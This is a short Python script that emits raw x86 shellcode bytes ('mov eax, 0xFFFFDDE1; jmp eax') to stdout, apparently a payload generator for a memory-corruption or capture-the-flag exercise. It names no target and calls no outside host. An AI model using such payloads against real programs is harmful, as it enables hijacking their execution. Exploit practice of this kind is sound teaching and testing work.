import sys
import struct

MOV_OP = b"\xb8"
TARGET_ADDR = struct.pack("<I", 0xFFFFDDE1)
JMP_OP = b"\xff\xe0"

sys.stdout.buffer.write(MOV_OP + TARGET_ADDR + JMP_OP)
